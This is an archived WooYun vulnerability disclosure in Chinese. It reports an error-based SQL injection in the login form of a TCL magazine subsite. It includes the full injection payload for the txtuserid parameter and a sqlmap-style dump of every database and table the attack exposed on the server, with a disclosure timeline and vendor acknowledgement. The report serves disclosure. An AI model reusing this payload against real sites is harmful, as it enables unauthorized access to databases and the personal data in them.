<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		tcl某分站post注入漏洞一枚  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		tcl某分站post注入漏洞一枚  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/big、face">big、face</a> 
</li><li>提交时间：		2013-11-20 10:40</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2013-11-20：	细节已通知厂商并且等待厂商处理中<br/>
									2013-11-20：	厂商已经确认，细节仅向厂商公开<br/>
									2013-11-30：	细节向核心白帽子及相关领域专家公开<br/>
									2013-12-10：	细节向普通白帽子公开<br/>
									2013-12-20：	细节向实习白帽子公开<br/>
									2014-01-04：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">tcl分站post注入一枚。。</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">注入链接：<br />
<br />
http://magazine.tcl.com/manager/login.aspx?ReturnUrl=%2fmanager%2fDefault.aspx<br />
<br />
<br />
<br />
</p><pre><code>---<br />
Place: (custom) POST<br />
Parameter: #1*<br />
    Type: error-based<br />
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause<br />
    Payload: __VIEWSTATE=/wEPDwUKMTQ2NTI5ODg0N2RkMnkFzBOIRgAXOQkn7n6vlpwGmYM=&amp;__<br />
EVENTVALIDATION=/wEWBAKA9vC5DAKz8dzmCQLyveCRDwKti4TYC2qxQGuzVG/2OTnZtdWt3tzeksig<br />
&amp;txtuserid=123456&#039; AND 6812=CONVERT(INT,(SELECT CHAR(113)+CHAR(102)+CHAR(107)+CH<br />
AR(97)+CHAR(113)+(SELECT (CASE WHEN (6812=6812) THEN CHAR(49) ELSE CHAR(48) END)<br />
)+CHAR(113)+CHAR(102)+CHAR(114)+CHAR(102)+CHAR(113))) AND &#039;rUnR&#039;=&#039;rUnR&amp;password=<br />
123123&amp;bnok=%C8%B7%B6%A8<br />
<br />
---</code></pre><p class='detail'> </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail"></p><pre><code>Database: tempdb<br />
[2 tables]<br />
+--------------------------------------------+<br />
| sysconstraints                             |<br />
| syssegments                                |<br />
+--------------------------------------------+<br />
<br />
Database: tclContacts<br />
[46 tables]<br />
+--------------------------------------------+<br />
| CountIP                                    |<br />
| Count_Iplocal                              |<br />
| EmailAuthorize                             |<br />
| EmailLog                                   |<br />
| EmailLog2                                  |<br />
| EmailSend                                  |<br />
| EmailTicket                                |<br />
| Fg_Template                                |<br />
| Groups                                     |<br />
| GroupsUser                                 |<br />
| HintRoot                                   |<br />
| History_of_Email                           |<br />
| IntervalSet                                |<br />
| News                                       |<br />
| OperateMan_temp_stat                       |<br />
| SysAdminSysLogonLog                        |<br />
| SysFunction                                |<br />
| SysLang                                    |<br />
| SysLogonLog                                |<br />
| SysMenu                                    |<br />
| SysModule                                  |<br />
| SysOperation                               |<br />
| SysParam                                   |<br />
| SysPower                                   |<br />
| SysRight                                   |<br />
| SysRightFunction                           |<br />
| SysRole                                    |<br />
| SysRole_temp                               |<br />
| SysSystemLog                               |<br />
| SysUser                                    |<br />
| SysUserRole                                |<br />
| TclStaff                                   |<br />
| TclStaffEmailKey                           |<br />
| WebParam                                   |<br />
| dept_name_translate                        |<br />
| dtproperties                               |<br />
| serialDeptno                               |<br />
| sysconstraints                             |<br />
| sysrole_test                               |<br />
| syssegments                                |<br />
| tang_Vietnam_account                       |<br />
| tang_en_account                            |<br />
| tblAutoSync                                |<br />
| tblExcel                                   |<br />
| uVoteContent                               |<br />
| uVoteTitle                                 |<br />
+--------------------------------------------+<br />
<br />
Database: msdb<br />
[83 tables]<br />
+--------------------------------------------+<br />
| RTblClassDefs                              |<br />
| RTblClassExtension                         |<br />
| RTblDBMProps                               |<br />
| RTblDBXProps                               |<br />
| RTblDTMProps                               |<br />
| RTblDTSProps                               |<br />
| RTblDatabaseVersion                        |<br />
| RTblEQMProps                               |<br />
| RTblEnumerationDef                         |<br />
| RTblEnumerationValueDef                    |<br />
| RTblGENProps                               |<br />
| RTblIfaceDefs                              |<br />
| RTblIfaceHier                              |<br />
| RTblIfaceMem                               |<br />
| RTblMDSProps                               |<br />
| RTblNamedObj                               |<br />
| RTblOLPProps                               |<br />
| RTblParameterDef                           |<br />
| RTblPropDefs                               |<br />
| RTblProps                                  |<br />
| RTblRelColDefs                             |<br />
| RTblRelshipDefs                            |<br />
| RTblRelshipProps                           |<br />
| RTblRelships                               |<br />
| RTblSIMProps                               |<br />
| RTblScriptDefs                             |<br />
| RTblSites                                  |<br />
| RTblSumInfo                                |<br />
| RTblTFMProps                               |<br />
| RTblTypeInfo                               |<br />
| RTblTypeLibs                               |<br />
| RTblUMLProps                               |<br />
| RTblUMXProps                               |<br />
| RTblVersionAdminInfo                       |<br />
| RTblVersions                               |<br />
| RTblWorkspaceItems                         |<br />
| backupfile                                 |<br />
| backupmediafamily                          |<br />
| backupmediaset                             |<br />
| backupset                                  |<br />
| log_shipping_databases                     |<br />
| log_shipping_monitor                       |<br />
| log_shipping_plan_databases                |<br />
| log_shipping_plan_history                  |<br />
| log_shipping_plans                         |<br />
| log_shipping_primaries                     |<br />
| log_shipping_secondaries                   |<br />
| logmarkhistory                             |<br />
| mswebtasks                                 |<br />
| restorefile                                |<br />
| restorefilegroup                           |<br />
| restorehistory                             |<br />
| sqlagent_info                              |<br />
| sysalerts                                  |<br />
| syscachedcredentials                       |<br />
| syscategories                              |<br />
| sysconstraints                             |<br />
| sysdbmaintplan_databases                   |<br />
| sysdbmaintplan_history                     |<br />
| sysdbmaintplan_jobs                        |<br />
| sysdbmaintplans                            |<br />
| sysdownloadlist                            |<br />
| sysdtscategories                           |<br />
| sysdtspackagelog                           |<br />
| sysdtspackages                             |<br />
| sysdtssteplog                              |<br />
| sysdtstasklog                              |<br />
| sysjobhistory                              |<br />
| sysjobs                                    |<br />
| sysjobs_view                               |<br />
| sysjobschedules                            |<br />
| sysjobservers                              |<br />
| sysjobsteps                                |<br />
| sysnotifications                           |<br />
| sysoperators                               |<br />
| syssegments                                |<br />
| systargetservergroupmembers                |<br />
| systargetservergroups                      |<br />
| systargetservers                           |<br />
| systargetservers_view                      |<br />
| systaskids                                 |<br />
| systasks                                   |<br />
| systasks_view                              |<br />
+--------------------------------------------+<br />
<br />
Database: pubs<br />
[14 tables]<br />
+--------------------------------------------+<br />
| authors                                    |<br />
| discounts                                  |<br />
| employee                                   |<br />
| jobs                                       |<br />
| pub_info                                   |<br />
| publishers                                 |<br />
| roysched                                   |<br />
| sales                                      |<br />
| stores                                     |<br />
| sysconstraints                             |<br />
| syssegments                                |<br />
| titleauthor                                |<br />
| titles                                     |<br />
| titleview                                  |<br />
+--------------------------------------------+<br />
<br />
Database: magazine<br />
[21 tables]<br />
+--------------------------------------------+<br />
| accreditarea                               |<br />
| accredited                                 |<br />
| caption                                    |<br />
| comd_list_H                                |<br />
| curqi                                      |<br />
| curqiF                                     |<br />
| downloadFileName                           |<br />
| dtproperties                               |<br />
| hitrecord                                  |<br />
| magamemo                                   |<br />
| magazines                                  |<br />
| program                                    |<br />
| sourceAccredit                             |<br />
| subscription                               |<br />
| sysconstraints                             |<br />
| syssegments                                |<br />
| t_jiaozhu_H                                |<br />
| unit                                       |<br />
| users                                      |<br />
| usersGroup                                 |<br />
| v_magazines                                |<br />
+--------------------------------------------+<br />
<br />
Database: master<br />
[36 tables]<br />
+--------------------------------------------+<br />
| INFORMATION_SCHEMA.CHECK_CONSTRAINTS       |<br />
| INFORMATION_SCHEMA.COLUMNS                 |<br />
| INFORMATION_SCHEMA.COLUMN_DOMAIN_USAGE     |<br />
| INFORMATION_SCHEMA.COLUMN_PRIVILEGES       |<br />
| INFORMATION_SCHEMA.CONSTRAINT_COLUMN_USAGE |<br />
| INFORMATION_SCHEMA.CONSTRAINT_TABLE_USAGE  |<br />
| INFORMATION_SCHEMA.DOMAINS                 |<br />
| INFORMATION_SCHEMA.DOMAIN_CONSTRAINTS      |<br />
| INFORMATION_SCHEMA.KEY_COLUMN_USAGE        |<br />
| INFORMATION_SCHEMA.PARAMETERS              |<br />
| INFORMATION_SCHEMA.REFERENTIAL_CONSTRAINTS |<br />
| INFORMATION_SCHEMA.ROUTINES                |<br />
| INFORMATION_SCHEMA.ROUTINE_COLUMNS         |<br />
| INFORMATION_SCHEMA.SCHEMATA                |<br />
| INFORMATION_SCHEMA.TABLES                  |<br />
| INFORMATION_SCHEMA.TABLE_CONSTRAINTS       |<br />
| INFORMATION_SCHEMA.TABLE_PRIVILEGES        |<br />
| INFORMATION_SCHEMA.VIEWS                   |<br />
| INFORMATION_SCHEMA.VIEW_COLUMN_USAGE       |<br />
| INFORMATION_SCHEMA.VIEW_TABLE_USAGE        |<br />
| MSreplication_options                      |<br />
| spt_datatype_info                          |<br />
| spt_datatype_info_ext                      |<br />
| spt_fallback_db                            |<br />
| spt_fallback_dev                           |<br />
| spt_fallback_usg                           |<br />
| spt_monitor                                |<br />
| spt_provider_types                         |<br />
| spt_server_info                            |<br />
| spt_values                                 |<br />
| sysconstraints                             |<br />
| syslogins                                  |<br />
| sysoledbusers                              |<br />
| sysopentapes                               |<br />
| sysremotelogins                            |<br />
| syssegments                                |<br />
+--------------------------------------------+<br />
<br />
Database: Northwind<br />
[31 tables]<br />
+--------------------------------------------+<br />
| Categories                                 |<br />
| CustomerCustomerDemo                       |<br />
| CustomerDemographics                       |<br />
| Customers                                  |<br />
| EmployeeTerritories                        |<br />
| Employees                                  |<br />
| Invoices                                   |<br />
| Orders                                     |<br />
| Products                                   |<br />
| Region                                     |<br />
| Shippers                                   |<br />
| Suppliers                                  |<br />
| Territories                                |<br />
| Alphabetical list of products              |<br />
| Category Sales for 1997                    |<br />
| Current Product List                       |<br />
| Customer and Suppliers by City             |<br />
| Order Details Extended                     |<br />
| Order Details                              |<br />
| Order Subtotals                            |<br />
| Orders Qry                                 |<br />
| Product Sales for 1997                     |<br />
| Products Above Average Price               |<br />
| Products by Category                       |<br />
| Quarterly Orders                           |<br />
| Sales Totals by Amount                     |<br />
| Sales by Category                          |<br />
| Summary of Sales by Quarter                |<br />
| Summary of Sales by Year                   |<br />
| sysconstraints                             |<br />
| syssegments                                |<br />
+--------------------------------------------+</code></pre><p class='detail'> </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">无 </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/big、face" title="big、face">big、face</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-043405" title="tcl某分站post注入漏洞一枚">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：中</p>
						<p class="detail">漏洞Rank：10 </p>
													<p class="detail">确认时间：2013-11-20 10:45</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">感谢你的工作，已转交相关单位确认处理。</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="43405";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
